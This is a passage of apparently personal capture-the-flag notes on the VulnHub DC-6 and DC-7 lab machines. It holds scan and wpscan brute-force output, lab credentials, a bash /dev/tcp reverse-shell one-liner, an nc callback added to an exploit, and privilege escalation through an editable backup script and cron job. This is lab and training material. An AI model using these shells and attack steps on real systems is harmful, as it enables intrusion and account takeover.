Synchronization,,,:/run/systemd:/bin/false<br />systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false<br />systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false<br />systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false<br />Debian-exim:x:104:109::/var/spool/exim4:/bin/false<br />messagebus:x:105:110::/var/run/dbus:/bin/false<br />statd:x:106:65534::/var/lib/nfs:/bin/false<br />sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin<br />dc:x:1000:1000:dc,,,:/home/dc:/bin/bash<br />mysql:x:108:113:MySQL Server,,,:/nonexistent:/bin/false   </div><div class='page'><h1 class='title level-6'>my.cnf</h1><br/>## The MySQL database server configuration file.## You can copy this to one of:# - &quot;/etc/mysql/my.cnf&quot; to set global options,# - &quot;~/.my.cnf&quot; to set user-specific options.# # One can use all long options that the program supports.# Run program with --help to get a list of available options and with# --print-defaults to see which it would actually understand and use.## For explanations see# http://dev.mysql.com/doc/mysql/en/server-system-variables.html# This will be passed to all mysql clients# It has been reported that passwords should be enclosed with ticks/quotes# escpecially if they contain &quot;#&quot; chars...# Remember to edit /etc/mysql/debian.cnf when changing the socket location.[client]port  = 3306socket  = /var/run/mysqld/mysqld.sock# Here is entries for some specific programs# The following values assume you have at least 32M ram# This was formally known as [safe_mysqld]. Both versions are currently parsed.[mysqld_safe]socket  = /var/run/mysqld/mysqld.socknice  = 0[mysqld]## * Basic Settings#user  = mysqlpid-file = /var/run/mysqld/mysqld.pidsocket  = /var/run/mysqld/mysqld.sockport  = 3306basedir  = /usrdatadir  = /var/lib/mysqltmpdir  = /tmplc-messages-dir = /usr/share/mysqlskip-external-locking## Instead of skip-networking the default is now to listen only on# localhost which is more compatible and is not less secure.bind-address  = 127.0.0.1## * Fine Tuning#key_buffer  = 16Mmax_allowed_packet = 16Mthread_stack  = 192Kthread_cache_size       = 8# This replaces the startup script and checks MyISAM tables if needed# the first time they are touchedmyisam-recover         = BACKUP#max_connections        = 100#table_cache            = 64#thread_concurrency     = 10## * Query Cache Configuration#query_cache_limit = 1Mquery_cache_size        = 16M## * Logging and Replication## Both location gets rotated by the cronjob.# Be aware that this log type is a performance killer.# As of 5.1 you can enable the log at runtime!#general_log_file        = /var/log/mysql/mysql.log#general_log             = 1## Error log - should be very few entries.#log_error = /var/log/mysql/error.log## Here you can see queries with especially long duration#slow_query_log_file = /var/log/mysql/mysql-slow.log#slow_query_log      = 1#long_query_time = 2#log_queries_not_using_indexes## The following can be used as easy to replay backup logs or for replication.# note: if you are setting up a replication slave, see README.Debian about#       other settings you may need to change.#server-id  = 1#log_bin   = /var/log/mysql/mysql-bin.logexpire_logs_days = 10max_binlog_size         = 100M#binlog_do_db  = include_database_name#binlog_ignore_db = include_database_name## * InnoDB## InnoDB is enabled by default with a 10MB datafile in /var/lib/mysql/.# Read the manual for more InnoDB related options. There are many!## * Security Features## Read the manual, too, if you want chroot!# chroot = /var/lib/mysql/## For generating SSL certificates I recommend the OpenSSL GUI &quot;tinyca&quot;.## ssl-ca=/etc/mysql/cacert.pem# ssl-cert=/etc/mysql/server-cert.pem# ssl-key=/etc/mysql/server-key.pem[mysqldump]quickquote-namesmax_allowed_packet = 16M[mysql]#no-auto-rehash # faster start of mysql but no tab completition[isamchk]key_buffer  = 16M## * IMPORTANT: Additional settings that can override those from this file!#   The files must end with &#39;.cnf&#39;, otherwise they&#39;ll be ignored.#!includedir /etc/mysql/conf.d/   </div><div class='page'><h1 class='title level-4'>DC-6</h1><br/>added wordy to hosts file<br />ran normal nmap revieling 22 and 80 being openran nikto and dirsearch revealing it was wordpress with limited directories<br />nikto revealed it was word press so I ran wpscan<br />wpscan found 5 users so I sent them against wpscan -e and rockyou.txt<br />was able to get a password for mark! helpdesk01<br />In the left pane the WP site had a plugin “activity monitor”<br />searchsploit found an exploit for it at exploits/php/webapps/45274.html<br />after moving the exploit I changed the “localhost:8000” to wordy:80 and added proper call out with nc (nc 192.168.11.136 3232)<br />I then started a listener<br />from there I simply opened a web browser and in the uri bar I hit ctrl-o and opened the modified .html exploit<br />listener created!!<br /><br />after a short amount of snooping I found a file named “things to do” in marks home and it had creds for graham. GSo7isUM1D4<br />ssh&#39;d into graham&#39;s account and found that I could run backup.sh in jens home as jens.<br />I edited the file to have a bash call back              bash -i &gt;&amp; /dev/tcp/192.168.11.136/3233 0&gt;&amp;1<br />started a nc listener<br />sudo -u jens /home/jens/backups.sh<br />now I have a shell as jens!!<br /><br />sudo -l             and I saw that I could run nmap as root<br />went to gtfobins and found an exploit<br />became root!!!<br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>nmap -sC -sV -p- -oN DC-6.txt 192.168.11.136<br /><br />wpscan --url <a href="http://dc-2/">http://wordy/</a> --enumerate u,ap,tt,t --ignore-main-redirect -o /root/Desktop/Machines/VulnHub/DC-6/WPScan.txt<br /><br />cewl -d 2 -m 5 -w cewlwords.txt <a href="http://dc-2/">http://</a>wordy<br /><br />wpscan --url <a href="http://dc-2">http://</a>wordy --passwords cewlwords.txt -e<br /><br />wpscan --url <a href="http://wordy">http://wordy</a> --passwords /root/Desktop/Tools/Wordlists/rockyou.txt -e<br /><br />wpscan --url <a href="http://wordy">http://wordy</a> -U usernamefile.txt -P /user/share/wordlists/rockyou.txt<br /><br />python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://wordy">http://wordy</a><br /><br />python2.7 /root/Desktop/Tools/LFISuite/lfisuite.py<br /><br />nikto -host <a href="http://192.168.11.133:80">http://192.168.11.133:80</a><br /><br /> <a href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a><br /> <br /> wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u <a href="http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z">http://wordy/wp-login.php?FUZZ=FUZ2Z</a>  | tee LFIList.txt<br /> <br /> graham - GSo7isUM1D4</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-6# nmap -sC -sV -p- -oN DC-6.txt 192.168.11.133<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-09 13:04 EDT<br />Nmap scan report for 192.168.11.133<br />Host is up (0.00037s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)<br />|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)<br />|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)<br />80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br />|_http-server-header: Apache/2.4.25 (Debian)<br />|_http-title: Did not follow redirect to <a href="http://wordy/">http://wordy/</a><br />MAC Address: 00:0C:29:F7:01:34 (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 10.86 seconds<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-6# nikto -host <a href="http://192.168.11.133:80">http://192.168.11.133:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.133<br />+ Target Hostname:    192.168.11.133<br />+ Target Port:        80<br />+ Start Time:         2019-10-09 13:20:17 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.25 (Debian)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ Uncommon header &#39;x-redirect-by&#39; found, with contents: WordPress<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Root page / redirects to: <a href="http://wordy/">http://wordy/</a><br />+ Uncommon header &#39;link&#39; found, with multiple values: (&lt;<a href="http://wordy/index.php/wp-json/>;">http://wordy/index.php/wp-json/&gt;;</a> rel=&quot;<a href="https://api.w.org/",<http://wordy/>;">https://api.w.org/&quot;,&lt;http://wordy/&gt;;</a> rel=shortlink,)<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ /wp-links-opml.php: This WordPress script reveals the installed version.<br />+ OSVDB-3092: /license.txt: License file found may identify site software.<br />+ Cookie wordpress_test_cookie created without the httponly flag<br />+ /wp-login.php: Wordpress login found<br />+ 7915 requests: 0 error(s) and 12 item(s) reported on remote host<br />+ End Time:           2019-10-09 13:21:13 (GMT-4) (56 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-6# python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://wordy">http://wordy</a><br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-09_13-12-57.log<br /><br />Target: <a href="http://wordy">http://wordy</a><br /><br />[13:12:57] Starting: <br />[13:12:57] 403 -  284B  - /.php<br />[13:12:57] 403 -  286B  - /icons/<br />[13:12:58] 200 -    0B  - /wp-content/<br />[13:12:58] 301 -    0B  - /index.php  -&gt;  <a href="http://wordy/">http://wordy/</a><br />[13:12:58] 200 -    3KB - /wp-login.php<br />[13:12:59] 200 -   42KB - /wp-includes/<br />[13:13:10] 200 -  135B  - /wp-trackback.php<br />[13:13:17] 302 -    0B  - /wp-admin/  -&gt;  <a href="http://wordy/wp-login.php?redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&amp;reauth=1</a><br />[13:13:40] 405 -   42B  - /xmlrpc.php<br />[13:14:55] 302 -    0B  - /wp-signup.php  -&gt;  <a href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a><br />[13:16:59] 403 -  294B  - /server-status/<br /><br />Task Completed<br /></div><div class='page'><h1 class='title level-6'>wpscan</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-6# wpscan --url <a href="http://wordy">http://wordy</a> --passwords /root/Desktop/Tools/Wordlists/rockyou.txt -e<br />_______________________________________________________________<br />        __          _______   _____<br />        \ \        / /  __ \ / ____|<br />         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br />          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \<br />           \  /\  /  | |     ____) | (__| (_| | | | |<br />            \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br /><br />        WordPress Security Scanner by the WPScan Team<br />                       Version 3.6.0<br />          Sponsored by Sucuri - <a href="https://sucuri.net">https://sucuri.net</a><br />      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_<br />_______________________________________________________________<br /><br />[+] URL: <a href="http://wordy/">http://wordy/</a><br />[+] Started: Wed Oct  9 15:28:47 2019<br /><br />Interesting Finding(s):<br /><br />[+] <a href="http://wordy/">http://wordy/</a><br /> | Interesting Entry: Server: Apache/2.4.25 (Debian)<br /> | Found By: Headers (Passive Detection)<br /> | Confidence: 100%<br /><br />[+] <a href="http://wordy/xmlrpc.php">http://wordy/xmlrpc.php</a><br /> | Found By: Direct Access (Aggressive Detection)<br /> | Confidence: 100%<br /> | References:<br /> |  - <a href="http://codex.wordpress.org/XML-RPC_Pingback_API">http://codex.wordpress.org/XML-RPC_Pingback_API</a><br /> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</a><br /> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos">https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</a><br /> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</a><br /> |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</a><br /><br />[+] <a href="http://wordy/readme.html">http://wordy/readme.html</a><br /> | Found By: Direct Access (Aggressive Detection)<br /> | Confidence: 100%<br /><br />[+] <a href="http://wordy/wp-cron.php">http://wordy/wp-cron.php</a><br /> | Found By: Direct Access (Aggressive Detection)<br /> | Confidence: 60%<br /> | References:<br /> |  - <a href="https://www.iplocation.net/defend-wordpress-from-ddos">https://www.iplocation.net/defend-wordpress-from-ddos</a><br /> |  - <a href="https://github.com/wpscanteam/wpscan/issues/1299">https://github.com/wpscanteam/wpscan/issues/1299</a><br /><br />[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).<br /> | Detected By: Rss Generator (Passive Detection)<br /> |  - <a href="http://wordy/index.php/feed/,">http://wordy/index.php/feed/,</a> &lt;generator&gt;<a href="https://wordpress.org/?v=5.1.1</generator>">https://wordpress.org/?v=5.1.1&lt;/generator&gt;</a><br /> |  - <a href="http://wordy/index.php/comments/feed/,">http://wordy/index.php/comments/feed/,</a> &lt;generator&gt;<a href="https://wordpress.org/?v=5.1.1</generator>">https://wordpress.org/?v=5.1.1&lt;/generator&gt;</a><br /> |<br /> | [!] 2 vulnerabilities identified:<br /> |<br /> | [!] Title: WordPress &lt;= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation<br /> |     Fixed in: 5.1.2<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9867">https://wpvulndb.com/vulnerabilities/9867</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222</a><br /> |      - <a href="https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/">https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68">https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68</a><br /> |<br /> | [!] Title: WordPress 5.0-5.2.2 - Authenticated Stored XSS in Shortcode Previews<br /> |     Fixed in: 5.1.2<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9864">https://wpvulndb.com/vulnerabilities/9864</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219</a><br /> |      - <a href="https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/">https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/</a><br /> |      - <a href="https://fortiguard.com/zeroday/FG-VD-18-165">https://fortiguard.com/zeroday/FG-VD-18-165</a><br /> |      - <a href="https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html">https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html</a><br /><br />[+] WordPress theme in use: twentyseventeen<br /> | Location: <a href="http://wordy/wp-content/themes/twentyseventeen/">http://wordy/wp-content/themes/twentyseventeen/</a><br /> | Last Updated: 2019-05-07T00:00:00.000Z<br /> | Readme: <a href="http://wordy/wp-content/themes/twentyseventeen/README.txt">http://wordy/wp-content/themes/twentyseventeen/README.txt</a><br /> | [!] The version is out of date, the latest version is 2.2<br /> | Style URL: <a href="http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1">http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1</a><br /> | Style Name: Twenty Seventeen<br /> | Style URI: <a href="https://wordpress.org/themes/twentyseventeen/">https://wordpress.org/themes/twentyseventeen/</a><br /> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br /> | Author: the WordPress team<br /> | Author URI: <a href="https://wordpress.org/">https://wordpress.org/</a><br /> |<br /> | Detected By: Css Style (Passive Detection)<br /> |<br /> | Version: 2.1 (80% confidence)<br /> | Detected By: Style (Passive Detection)<br /> |  - <a href="http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1,">http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1,</a> Match: &#39;Version: 2.1&#39;<br /><br />[+] Enumerating Vulnerable Plugins (via Passive Methods)<br /><br />[i] No plugins Found.<br /><br />[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)<br /> Checking Known Locations - Time: 00:00:00 &lt;==========================================================================================&gt; (313 / 313) 100.00% Time: 00:00:00<br />[+] Checking Theme Versions (via Passive and Aggressive Methods)<br /><br />[i] No themes Found.<br /><br />[+] Enumerating Timthumbs (via Passive and Aggressive Methods)<br /> Checking Known Locations - Time: 00:00:01 &lt;========================================================================================&gt; (2573 / 2573) 100.00% Time: 00:00:01<br /><br />[i] No Timthumbs Found.<br /><br />[+] Enumerating Config Backups (via Passive and Aggressive Methods)<br /> Checking Config Backups - Time: 00:00:00 &lt;=============================================================================================&gt; (21 / 21) 100.00% Time: 00:00:00<br /><br />[i] No Config Backups Found.<br /><br />[+] Enumerating DB Exports (via Passive and Aggressive Methods)<br /> Checking DB Exports - Time: 00:00:00 &lt;=================================================================================================&gt; (36 / 36) 100.00% Time: 00:00:00<br /><br />[i] No DB Exports Found.<br /><br />[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)<br /> Brute Forcing Attachment IDs - Time: 00:00:00 &lt;======================================================================================&gt; (100 / 100) 100.00% Time: 00:00:00<br /><br />[i] No Medias Found.<br /><br />[+] Enumerating Users (via Passive and Aggressive Methods)<br /> Brute Forcing Author IDs - Time: 00:00:00 &lt;============================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00<br /><br />[i] User(s) Identified:<br /><br />[+] admin<br /> | Detected By: Rss Generator (Passive Detection)<br /> | Confirmed By:<br /> |  Wp Json Api (Aggressive Detection)<br /> |   - <a href="http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1">http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</a><br /> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> |  Login Error Messages (Aggressive Detection)<br /><br />[+] sarah<br /> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> | Confirmed By: Login Error Messages (Aggressive Detection)<br /><br />[+] graham<br /> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> | Confirmed By: Login Error Messages (Aggressive Detection)<br /><br />[+] mark<br /> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> | Confirmed By: Login Error Messages (Aggressive Detection)<br /><br />[+] jens<br /> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> | Confirmed By: Login Error Messages (Aggressive Detection)<br /><br />[+] Performing password attack on Xmlrpc against 5 user/s<br />[SUCCESS] - mark / helpdesk01                                                                                                                                             <br />^Cying graham / kingkong Time: 00:00:12 &lt;                                                                                        &gt; (5265 / 57377571)  0.00%  ETA: 36:30:59<br />[i] Valid Combinations Found:<br /> | Username: mark, Password: helpdesk01<br /><br />Trying admin / pickle Time: 00:00:12 &lt;                                                                                           &gt; (5270 / 57377571)  0.00%  ETA: 36:38:16<br />[+] Finished: Wed Oct  9 15:29:10 2019<br />[+] Requests Done: 4012<br />[+] Cached Requests: 4375<br />[+] Data Sent: 1.055 MB<br />[+] Data Received: 1.005 MB<br />[+] Memory used: 651.883 MB<br />[+] Elapsed time: 00:00:22<br /><br />Scan Aborted: Canceled by User<br /></div><div class='page'><h1 class='title level-6'>wfuzz</h1><br/><br /><br /></div><div class='page'><h1 class='title level-6'>cewl</h1><br/></div><div class='page'><h1 class='title level-5'>flag</h1><br/>cat theflag.txt<br /><br /><br />Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b <br /> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P <br />  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#39; <br />   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) <br /><br /><br />Congratulations!!!<br /><br />Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those<br />who have provided feedback, and who have taken time to complete these little<br />challenges.<br /><br />If you enjoyed this CTF, send me a tweet via @DCAU7.<br /></div><div class='page'><h1 class='title level-4'>DC-7</h1><br/>normal nmap and found that 80 and 443 are open<br />dirsearch and nikto found that it was drupal 8<br />kicked off drupwn and confirmed that the machine was drupal 8<br />Checked the bottom footer and saw it was a link to a twitter<br />the twitter pointed me to a github<br />the github gave me the username password $username = &quot;dc7user&quot;; $password = &quot;MdR3xOgB7#dW&quot;; (after grep -r ing)<br />with this I was able to login via ssh!<br />in the ~/backups dir there were two encrypted gpg files<br />found gpg creds with <a href="Machines--HTB--1-99--10.10.10.29_Bank--LinEnum.html">LinEnum</a> (ps)<br />opened and greped website.sql file and found users admin and dc7user with hashed creds<br />I could not break the creds<br />used drush to set the admin password to yeet<br />Now I can log in to the webpage as an admin!<br />went to extensions and added the drupal php module (version dose not matter) Made sure to enable it and check configs<br />I then went to content&gt;add content&gt;basic page. set text format to “PHP code” and dropped in code from pentestmonkey (<a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">http://pentestmonkey.net/tools/web-shells/perl-reverse-shell</a>)<br />opened a nc listener<br />hit save and the code executed!<br />now that I am www-data I am able to add a line to the backup.sh cron job being run by root!<br />open a nc listener<br />wait a minute...<br />root cannon!!<br /><br /> </div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>nmap -sC -sV -p- -oN Nmap.txt 192.168.11.134<br /><br />python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.133">http://192.168.11.133</a><br /><br />nikto -host <a href="http://192.168.11.136:80">http://192.168.11.136:80</a><br /><br />drupwn enum <a href="http://192.168.11.134">http://192.168.11.134</a><br /><br />cewl -d 2 -m 5 -w cewlwords.txt <a href="http://192.168.11.134">http://192.168.11.134</a><br /><br /><a href="http://192.168.11.134/user/password?name=sarah">http://192.168.11.134/user/password?name=sarah</a><br /><br />wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u <a href="http://192.168.11.134/user/password?FUZZ=FUZ2Z">http://192.168.11.134/user/password?FUZZ=FUZ2Z</a><br /><br />root@kali:~/Desktop/Machines/VulnHub/DC-7/twitter/staffdb# cat config.php <br />&lt;?php<br />	$servername = &quot;localhost&quot;;<br />	$username = &quot;dc7user&quot;;<br />	$password = &quot;MdR3xOgB7#dW&quot;;<br />	$dbname = &quot;Staff&quot;;<br />	$conn = mysqli_connect($servername, $username, $password, $dbname);<br />root@kali:~/Desktop/Machines/VulnHub/DC-7/twitter/staffdb# <br /><br />dc7user@dc-7:~/backups$ gpg --output website.sql --decrypt website.sql.gpg <br />gpg: AES256 encrypted data<br />gpg: encrypted with 1 passphrase<br />gpg: decryption failed: Bad session key<br /><br />root      1137 96.7  0.4  33792  4528 ?        DL   22:00   0:24 gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.s<br />ql<br /><br /><br /><br /><br />/sites/default/settings.php &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;where mysql password is normally stored for drupal<br />$databases[&#39;default&#39;][&#39;default&#39;] = array (<br />  &#39;database&#39; =&gt; &#39;d7db&#39;,<br />  &#39;username&#39; =&gt; &#39;db7user&#39;,<br />  &#39;password&#39; =&gt; &#39;yNv3Po00&#39;,<br />  &#39;prefix&#39; =&gt; &#39;&#39;,<br />  &#39;host&#39; =&gt; &#39;localhost&#39;,<br />  &#39;port&#39; =&gt; &#39;&#39;,<br />  &#39;namespace&#39; =&gt; &#39;Drupal\\Core\\Database\\Driver\\mysql&#39;,<br />  &#39;driver&#39; =&gt; &#39;mysql&#39;,<br />);<br />$config_directories[&#39;sync&#39;] = &#39;sites/default/files/config_yQDLLJdPf9UT4DSAB5Wfl6XeoBn0AqtLqUYyVc4KUWQW-3USMUdXWY0UZmZ3Az5mT_DMS955DQ/sync&#39;;<br />dc7user@dc-7:/var/www/html/sites/default$ <br /> <br /> <br /> LOCK TABLES `users_field_data` WRITE;<br />/*!40000 ALTER TABLE `users_field_data` DISABLE KEYS */;<br />set autocommit=0;<br />INSERT INTO `users_field_data` VALUES (0,&#39;en&#39;,&#39;en&#39;,NULL,&#39;&#39;,NULL,NULL,&#39;&#39;,0,1567054076,1567054076,0,0,NULL,1),(1,&#39;en&#39;,&#39;en&#39;,NULL,&#39;admin&#39;,&#39;$S$Ead.KmIcT/yfKC.1H53aDPJasaD7o.ioEGiaPy1lLyXXAJC/Qi4F&#39;,&#39;admin@example.com&#39;,&#39;Australia/Melbourne&#39;,1,1567054076,1567054076,1567098850,1567098643,&#39;admin@example.com&#39;,1),(2,&#39;en&#39;,&#39;en&#39;,&#39;en&#39;,&#39;dc7user&#39;,&#39;$S$EKe0kuKQvFhgFnEYMpq.mRtbl/TQ5FmEjCDxbu0HIHaO0/U.YFjI&#39;,&#39;dc7user@blah.com&#39;,&#39;Australia/Brisbane&#39;,1,1567057938,1567057938,0,0,&#39;dc7user@blah.com&#39;,1);<br />/*!40000 ALTER TABLE `users_field_data` ENABLE KEYS */;<br />UNLOCK TABLES;<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-7# nmap -sC -sV -p- -oN Nmap.txt 192.168.11.134<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-09 17:09 EDT<br />Nmap scan report for 192.168.11.134<br />Host is up (0.00047s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)<br />|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)<br />|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)<br />80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br />|_http-generator: Drupal 8 (<a href="https://www.drupal.org)">https://www.drupal.org)</a><br />| http-robots.txt: 22 disallowed entries (15 shown)<br />| /core/ /profiles/ /README.txt /web.config /admin/ <br />| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ <br />| /user/password/ /user/login/ /user/logout/ /index.php/admin/ <br />|_/index.php/comment/reply/<br />|_http-server-header: Apache/2.4.25 (Debian)<br />|_http-title: Welcome to DC-7 | D7<br />MAC Address: 00:0C:29:F5:75:1D (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 11.38 seconds<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-7# python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.134">http://192.168.11.134</a><br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-09_17-12-59.log<br /><br />Target: <a href="http://192.168.11.134">http://192.168.11.134</a><br /><br />[17:12:59] Starting: <br />[17:12:59] 403 -  293B  - /.php<br />[17:13:00] 302 -  376B  - /search/  -&gt;  <a href="http://192.168.11.134/search/node">http://192.168.11.134/search/node</a><br />[17:13:00] 200 -    9KB - /index.php<br />[17:13:02] 403 -  295B  - /icons/<br />[17:13:04] 403 -  296B  - /themes/<br />[17:13:04] 302 -  372B  - /user/  -&gt;  <a href="http://192.168.11.134/user/login">http://192.168.11.134/user/login</a><br />[17:13:05] 403 -  297B  - /modules/<br />[17:13:11] 403 -    